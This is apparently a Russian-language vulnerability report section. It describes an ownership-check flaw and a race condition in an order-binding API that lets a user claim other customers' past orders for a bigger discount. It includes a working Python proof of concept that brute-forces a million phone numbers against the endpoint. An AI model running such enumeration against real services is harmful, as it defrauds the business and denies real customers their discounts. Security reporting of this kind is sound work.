4. Конкретное описание уязвимости
функция `bind_old_orders` привязывает заказы используя только номер телефона, не проверяя что номер принадлежит текущему пользователю следовательно мы можем указать любой номер телефона который совершал заказ и получить скидку больше чем должна быть на самом деле, и вся защита находится в браузере, то есть если мы сами отправим запрос, через бурп то обойдем браузерную защиту и сможем получить дополнительную скидку на наш аккаунт 
Максимальный реальный риск:
Пользователь может привязать старые заказы с других номеров получить самую большую скидку и заблокировать настоящему заказчику возможность ее получения, так же так как нет транзакции возникает Race Conditions и если два одновременных запроса придут на один номер то их перепривяжут дважды 
Эксплуатация:
PoC:
```python
import requests

BASE_URL = "https://app.com"
API_ENDPOINT = f"{BASE_URL}/api/bind_old_orders"

cookies = {
    "session": "cookie",
    "_csrf": "csrf"
}

headers = {
    "X-CSRF-Token": "csrfe",
    "Content-Type": "application/json",
    "Referer": BASE_URL
}

def exploit():
    start_number = 79000000000
    attempts = 1000000 

    for i in range(attempts):
        phone = str(start_number + i)
        payload = {"phone_number": phone}
        
        try:
            response = requests.post(
                API_ENDPOINT, 
                json=payload, 
                cookies=cookies, 
                headers=headers
            )
            
            if response.status_code == 200:
                print(f"Success: {phone} | Response: {response.json().get('message')}")
            else:
                print(f"Failed for {phone}: {response.status_code}")
                
        except Exception as e:
            print(f"[!] Error: {e}")
            break

if __name__ == "__main__":
    exploit()
```
С помощью этого PoС набиваем максимальную скидку,а Race Conditions нужно делать через бурп repeater
